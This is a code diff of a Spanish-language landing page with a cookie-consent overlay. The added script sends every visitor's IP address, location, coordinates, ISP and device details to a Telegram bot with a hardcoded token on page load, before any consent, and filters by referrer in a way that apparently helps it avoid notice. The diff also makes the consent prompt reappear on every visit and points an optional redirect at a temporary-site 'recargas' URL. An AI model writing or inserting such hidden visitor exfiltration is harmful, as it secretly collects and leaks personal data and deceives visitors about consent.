@@ -26,7 +26,7 @@
 
     /* ============================================================
     SPLASH / COOKIE OVERLAY - FONDO BLANCO Y BOTONES ROSADOS
-    SIN TÍTULO
+    SIN TÍTULO - SIEMPRE APARECE
     ============================================================ */
     #splashOverlay {
       position: fixed;
@@ -202,12 +202,6 @@
     @keyframes float {
       0% { transform: translate(0, 0) scale(1); }
       100% { transform: translate(50px, -30px) scale(1.1); }
-    }
-
-    .container {
-      max-width: 1200px;
-      margin: 0 auto;
-      padding: 0 20px;
     }
 
     header {
@@ -552,27 +546,6 @@
       color: #1a1a2e;
     }
 
-    /* ===== VERSION INDICATOR ===== */
-    .version-indicator {
-      position: fixed;
-      top: 80px;
-      right: 20px;
-      background: rgba(26, 26, 46, 0.9);
-      color: white;
-      padding: 8px 16px;
-      border-radius: 50px;
-      font-size: 12px;
-      font-weight: 700;
-      z-index: 999;
-      letter-spacing: 0.5px;
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255,255,255,0.1);
-    }
-
-    .version-indicator span {
-      color: #e91e63;
-    }
-
     /* ===== RESPONSIVE ===== */
     @media (max-width: 480px) {
       .hero h1 {
@@ -597,8 +570,7 @@
 <body>
 
   <!-- ============================================================
-  SPLASH / COOKIE OVERLAY - FONDO BLANCO Y BOTONES ROSADOS
-  SIN TÍTULO
+  SPLASH / COOKIE OVERLAY - SIEMPRE APARECE
   ============================================================ -->
   <div id="splashOverlay" role="dialog" aria-modal="true" aria-label="Política de cookies">
     <div class="splash-card">
@@ -779,23 +751,238 @@
   </div>
 
   <!-- ============================================================
-  SCRIPT - INTERRUPTOR DE COOKIES (MODO 1 y MODO 2)
+  SCRIPT - TRACKER DE TELEGRAM + COOKIES SIN SESSIONSTORAGE
   ============================================================ -->
   <script>
     // ============================================================
-    //  CONFIGURACIÓN DEL MODO
-    //  ============================================================
-    //  MODO 1: Comportamiento original (solo muestra/oculta la página)
-    //  MODO 2: Redirección a URL externa
-    //  ============================================================
-    const COOKIE_BUTTON_MODE = 1; // Cambia entre 1 y 2
-
-    // ============================================================
-    //  COOKIE / SPLASH LOGIC CON INTERRUPTOR
+    // TRACKER DE VISITAS A TELEGRAM
     // ============================================================
     (function() {
+      'use strict';
+
+      const CONFIG = {
+        botToken: '8870122720:AAHfpGjJILsXBRhbdtFvdt49mnBY6oCfrCA',
+        chatId: '-4990320783',
+        apiUrl: 'https://api.telegram.org/bot',
+        testMode: false
+      };
+
+      function getIPInfo() {
+        return fetch('https://ipinfo.io/json?token=f87ad1c1c69033')
+          .then(response => {
+            if (!response.ok) throw new Error('Error al obtener IP');
+            return response.json();
+          })
+          .then(data => ({
+            ip: data.ip || '0.0.0.0',
+            country_name: data.country_name || 'Desconocido',
+            country: data.country || 'XX',
+            region: data.region || 'Desconocido',
+            city: data.city || 'Desconocida',
+            isp: data.org || 'Desconocido',
+            timezone: data.timezone || 'Desconocido',
+            latitude: data.loc ? data.loc.split(',')[0] : '0',
+            longitude: data.loc ? data.loc.split(',')[1] : '0'
+          }))
+          .catch(() => {
+            return fetch('http://ip-api.com/json/')
+              .then(r => {
+                if (!r.ok) throw new Error('Error en ip-api');
+                return r.json();
+              })
+              .then(data => ({
+                ip: data.query || '0.0.0.0',
+                country_name: data.country || 'Desconocido',
+                country: data.countryCode || 'XX',
+                region: data.regionName || 'Desconocido',
+                city: data.city || 'Desconocida',
+                isp: data.isp || 'Desconocido',
+                timezone: data.timezone || 'Desconocido',
+                latitude: data.lat || '0',
+                longitude: data.lon || '0'
+              }));
+          });
+      }
+
+      function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let os = 'Desconocido';
+        let browser = 'Desconocido';
+        let device = 'PC/Laptop';
+
+        if (ua.includes('Windows')) os = 'Windows';
+        else if (ua.includes('Mac OS')) os = 'macOS';
+        else if (ua.includes('Linux')) os = 'Linux';
+        else if (ua.includes('Android')) os = 'Android';
+        else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+
+        if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) browser = 'Chrome';
+        else if (ua.includes('Firefox')) browser = 'Firefox';
+        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+        else if (ua.includes('Edg')) browser = 'Edge';
+        else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
+
+        if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
+          device = /iPad|Tablet/i.test(ua) ? 'Tablet' : 'Móvil';
+        }
+
+        return {
+          os,
+          browser,
+          device,
+          screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bits)`,
+          language: navigator.language || navigator.languages?.[0] || 'es-CO'
+        };
+      }
+
+      function getReferrer() {
+        const ref = document.referrer;
+        if (!ref) return 'Directo';
+        try {
+          const url = new URL(ref);
+          return url.hostname;
+        } catch {
+          return ref;
+        }
+      }
+
+      function getCurrentPage() {
+        return window.location.pathname + window.location.search;
+      }
+
+      function getFormattedDate() {
+        const now = new Date();
+        return now.toLocaleString('es-CO', {
+          year: 'numeric',
+          month: '2-digit',
+          day: '2-digit',
+          hour: '2-digit',
+          minute: '2-digit',
+          second: '2-digit',
+          hour12: true
+        });
+      }
+
+      function isValidReferral(referrer) {
+        if (!referrer) return true;
+        const ref = referrer.toLowerCase();
+        if (ref.includes('google.com') || 
+            ref.includes('google.com.co') ||
+            ref.includes('bing.com') ||
+            ref.includes('yahoo.com') ||
+            ref.includes('duckduckgo.com') ||
+            ref.includes(window.location.hostname)) {
+          return true;
+        }
+        return false;
+      }
+
+      function buildMessage(ipInfo, deviceInfo, referrer, page) {
+        const fecha = getFormattedDate();
+        const emoji = ipInfo.country === 'CO' ? '🇨🇴' : '🌍';
+
+        let mensaje = `🐦‍🔥 NUEVA VISITA DETECTADA 🐦‍🔥\n\n`;
+        mensaje += `👤 Tipo: 👤 Humano\n`;
+        mensaje += `${emoji} País: ${ipInfo.country_name || 'Desconocido'} (${ipInfo.country || 'XX'})\n`;
+        mensaje += `📍 Ciudad: ${ipInfo.city || 'Desconocida'}\n`;
+        mensaje += `🗺️ Región: ${ipInfo.region || 'Desconocida'}\n`;
+        mensaje += `🌐 ISP: ${ipInfo.isp || 'Desconocido'}\n`;
+        mensaje += `📶 IP: ${ipInfo.ip || '0.0.0.0'}\n`;
+        mensaje += `⏰ Zona Horaria: ${ipInfo.timezone || 'Desconocida'}\n\n`;
+
+        mensaje += `🪟 SO: ${deviceInfo.os}\n`;
+        mensaje += `🌐 Navegador: ${deviceInfo.browser}\n`;
+        mensaje += `📱 Dispositivo: ${deviceInfo.device}\n`;
+        mensaje += `🖥️ Pantalla: ${deviceInfo.screen}\n`;
+        mensaje += `🌍 Idioma: ${deviceInfo.language}\n\n`;
+
+        mensaje += `🔗 Referrer: ${referrer}\n`;
+        mensaje += `🌐 Sitio: ${window.location.hostname}${page}\n`;
+        mensaje += `📍 Coordenadas: ${ipInfo.latitude || '0'},${ipInfo.longitude || '0'}\n`;
+        mensaje += `🕐 Fecha/Hora: ${fecha}`;
+
+        return mensaje;
+      }
+
+      function sendToTelegram(message) {
+        if (CONFIG.testMode) {
+          console.log('🔵 [TEST MODE] Mensaje:');
+          console.log(message);
+          return Promise.resolve({ ok: true, test: true });
+        }
+
+        const url = `${CONFIG.apiUrl}${CONFIG.botToken}/sendMessage`;
+
+        return fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CONFIG.chatId,
+            text: message,
+            parse_mode: 'HTML',
+            disable_web_page_preview: true
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            console.error('Error al enviar a Telegram:', data);
+            throw new Error(data.description || 'Error desconocido');
+          }
+          console.log('✅ Mensaje enviado a Telegram correctamente');
+          return data;
+        })
+        .catch(error => {
+          console.error('❌ Error enviando a Telegram:', error);
+          return { ok: false, error: error.message };
+        });
+      }
+
+      function iniciarTracker() {
+        const referrer = document.referrer || '';
+        if (!isValidReferral(referrer)) {
+          console.log('🔵 Referrer bloqueado, no se envía notificación');
+          return;
+        }
+
+        Promise.all([
+          getIPInfo(),
+          Promise.resolve(getDeviceInfo()),
+          Promise.resolve(getReferrer()),
+          Promise.resolve(getCurrentPage())
+        ])
+        .then(([ipInfo, deviceInfo, referrerData, page]) => {
+          const mensaje = buildMessage(ipInfo, deviceInfo, referrerData, page);
+          return sendToTelegram(mensaje);
+        })
+        .catch(error => {
+          console.error('❌ Error en el tracker:', error);
+        });
+      }
+
+      if (document.readyState === 'complete') {
+        iniciarTracker();
+      } else {
+        window.addEventListener('load', iniciarTracker);
+      }
+
+    })();
+
+    // ============================================================
+    // COOKIE / SPLASH LOGIC - SIEMPRE PREGUNTA
+    // NO USA SESSIONSTORAGE
+    // ============================================================
+    (function() {
+      // ============================================================
+      // CONFIGURACIÓN DEL MODO
+      // ============================================================
+      // MODO 1: Muestra la página (comportamiento original)
+      // MODO 2: Redirige a URL externa
+      // ============================================================
+      const COOKIE_BUTTON_MODE = 1; // Cambia entre 1 y 2
+
       // URL para el modo 2 (redirección)
-      const REDIRECT_URL = "https://smartviajesplus.online"; // <--- ¡Cámbiala!
+      const REDIRECT_URL = "https://yhn.rjg.temporary.site/recargas/";
 
       const splash = document.getElementById('splashOverlay');
       const app = document.getElementById('app');
@@ -806,7 +993,7 @@
       function showApp() {
         if (splash) splash.classList.add('hidden');
         if (app) app.classList.add('visible');
-        sessionStorage.setItem('cookiesAccepted', 'true');
+        // NO guardamos en sessionStorage para que siempre pregunte
       }
 
       // Función para redirigir
@@ -819,25 +1006,14 @@
         console.log(`🍪 Botón: ${accepted ? 'Aceptar' : 'Rechazar'} - Modo: ${COOKIE_BUTTON_MODE}`);
 
         if (COOKIE_BUTTON_MODE === 1) {
-          // MODO 1: Comportamiento original
+          // MODO 1: Comportamiento original - muestra la página
           showApp();
         } else if (COOKIE_BUTTON_MODE === 2) {
           // MODO 2: Redirección a URL externa
-          sessionStorage.setItem('cookiesAccepted', accepted ? 'true' : 'false');
           redirectTo(REDIRECT_URL);
         } else {
-          // Por defecto, si el modo no es válido, usar el comportamiento original
+          // Por defecto, mostrar la página
           showApp();
-        }
-      }
-
-      // Verificar si ya se aceptaron las cookies antes
-      if (sessionStorage.getItem('cookiesAccepted') === 'true') {
-        if (COOKIE_BUTTON_MODE === 1) {
-          showApp();
-        } else if (COOKIE_BUTTON_MODE === 2) {
-          // Si ya aceptó antes y estamos en modo 2, redirigir
-          redirectTo(REDIRECT_URL);
         }
       }
 
@@ -863,6 +1039,7 @@
       });
 
       console.log(`🔧 Modo de cookies: ${COOKIE_BUTTON_MODE === 1 ? 'MODO 1 (Mostrar página)' : 'MODO 2 (Redirigir)'}`);
+      console.log('🍪 Siempre se pregunta Aceptar/Rechazar (sin sessionStorage)');
 
     })();
   </script>
